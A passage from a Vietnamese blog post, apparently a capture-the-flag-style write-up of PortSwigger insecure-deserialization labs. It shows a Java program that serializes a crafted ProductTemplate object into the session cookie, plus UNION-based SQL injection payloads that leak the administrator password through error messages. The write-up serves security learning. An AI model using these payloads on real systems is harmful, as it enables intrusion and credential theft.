Khi server deserialize object này, gadget chain trong Ruby on Rails sẽ được kích hoạt → dẫn tới thực thi command và lỗi server 500 → file `morale.txt` bị xóa → solve lab.

![image.png](/assets/images/insecure-deserialization/image%2031.png)

So với 2 lab trước:

- Java → dùng gadget chain có sẵn qua tool
- PHP → dùng gadget chain + bypass signature
- Ruby → không có tool → phải dùng exploit public rồi chỉnh lại

=> level tăng dần: từ "dùng tool" → "hiểu cơ chế" → "tự adapt exploit"

## Tự xây dựng gadget chain

Khi không còn tool như ysoserial, không có gadget chain public, thì bắt buộc phải tự build chain từ source code.

Flow chuẩn sẽ là:

- tìm magic method (ví dụ `readObject()` trong Java)
- xem method này xử lý gì với dữ liệu attacker control
- nếu không nguy hiểm trực tiếp → dùng nó làm "kick-off gadget"
- lần theo các method được gọi tiếp theo
- mục tiêu cuối: tìm được "sink" (SQL, exec, file, v.v.)

=> bản chất là **trace data flow** từ input → sink.

## Lab: Developing a custom gadget chain (Java)

![image.png](/assets/images/insecure-deserialization/image%2032.png)

## 1. Xác định lỗ hổng

- Sau khi đăng nhập bằng tài khoản `wiener:peter`, quan sát thấy **session cookie chứa một Java serialized object**.

![image.png](/assets/images/insecure-deserialization/image%2033.png)

![image.png](/assets/images/insecure-deserialization/image%2034.png)

- Truy cập thư mục `/backup/` và thu thập được source code của ứng dụng, bao gồm:
    - `AccessTokenUser.java`
    
    ![image.png](/assets/images/insecure-deserialization/image%2035.png)
    
    - `ProductTemplate.java`

![image.png](/assets/images/insecure-deserialization/image%2036.png)

- Trong đó, class `ProductTemplate` chứa phương thức đặc biệt `readObject()` — một **deserialization hook** được JVM tự động gọi khi object được khôi phục từ dữ liệu serialized.
- Phân tích chi tiết cho thấy:
    - Thuộc tính `id` của object được khôi phục từ dữ liệu do người dùng kiểm soát (session cookie)
    - Giá trị này được đưa trực tiếp vào câu lệnh SQL thông qua `String.format()`:

```
String sql = String.format(
"SELECT * FROM products WHERE id = '%s' LIMIT 1", id
);
```

- Không có bất kỳ cơ chế:
    - validate đầu vào
    - escaping
    - hoặc sử dụng prepared statement

 Điều này tạo điều kiện cho attacker chèn payload SQL tùy ý.

Lỗ hổng xuất phát từ sự kết hợp của hai vấn đề nghiêm trọng:

## 1. Phân tích Root Cause

### 1. Insecure Deserialization

- Ứng dụng deserialize dữ liệu từ session cookie mà không:
    - xác thực tính toàn vẹn
    - kiểm tra kiểu object
- Cho phép attacker cung cấp object tùy ý (ví dụ: `ProductTemplate` thay vì `AccessTokenUser`)

### 2. Unsafe Logic trong `readObject()`

- Phương thức `readObject()` chứa logic truy vấn database
- Sử dụng dữ liệu không tin cậy (`id`) trực tiếp trong SQL

## 2. Xác nhận khai thác

- Viết một chương trình Java:
    - Tạo object `ProductTemplate`
    - Gán `id = "'"` (single quote)
    - Serialize + Base64 encode
- Gửi payload qua cookie `session`

Nhận được lỗi SQL → xác nhận:

> Có thể inject SQL thông qua object deserialization
> 

## 

```java
import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("your-payload-here");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object ID: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

![image.png](/assets/images/insecure-deserialization/image%2037.png)

![image.png](/assets/images/insecure-deserialization/image%2038.png)

Sau khi dán payload tạo ra vào cookie thì chúng ta có thể thấy được phản hồi từ server trả về là 500

![image.png](/assets/images/insecure-deserialization/image%2039.png)

Dòng lỗi `Unterminated string literal started at position 36...` xác nhận 2 điều cực kỳ quan trọng:

1. **Java Deserialization thành công:** Server đã nhận đối tượng bạn gửi lên, giải mã nó và gọi phương thức `readObject()`.
2. **SQL Injection thành công:** Dấu nháy đơn `'` của mình đã lọt vào câu lệnh SQL và làm nó bị lỗi cú pháp (`WHERE id = '''`).

## 4. Khai thác SQL Injection

Có nhiều cách để trích xuất mật khẩu, nhưng trong giải pháp này, chúng ta sẽ thực hiện một phương pháp đơn giản dựa trên UNION-Based

### Bước 1: Xác định số cột

```
' ORDER BY 8--
```

→ xác định có **8 columns**

### Bước 2: Xác định kiểu dữ liệu

- Nhận thấy:
    - cột 4, 5, 6 không nhận string
    - lỗi trả về phản ánh input

### Bước 3: Tìm bảng chứa password

→ phát hiện:

- bảng: `users`
- cột: `password`

## 5. Dump password

Payload:

![image.png](/assets/images/insecure-deserialization/image%2040.png)

```
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```

Trigger lỗi → password hiển thị trong error message

![image.png](/assets/images/insecure-deserialization/image%2041.png)

## 6. Hoàn thành lab

- Đăng nhập bằng:
    
    ```
    username: administrator
    password: (đã extract)
    ```
    
- Truy cập admin panel
- Xóa user `carlos`

![image.png](/assets/images/insecure-deserialization/image%2042.png)

Vậy cuối cùng kết luận lại thì bài Lab này đã minh họa chuỗi tấn công:

```
Insecure Deserialization
→ Control object input
→ Trigger readObject()
→ SQL Injection
→ Extract sensitive data
```

Và để có thể hiểu rõ sâu hơn về các real-case thì các bạn có thể tham khảo bài viết tái tạo N-day của mình về lỗ hổng này :[https://phucquan.github.io/security research/2026/04/07/n-day-post1.html](https://phucquan.github.io/security%20research/2026/04/07/n-day-post1.html)

Và hiện tại thì bài blog về lỗ hổng của mình của khá dài rồi ,mình xin kết thúc tại đây. Cảm ơn các bạn đã dành thời gian để đọc và hẹn gặp các bạn trong các bài tiếp theo.!!!
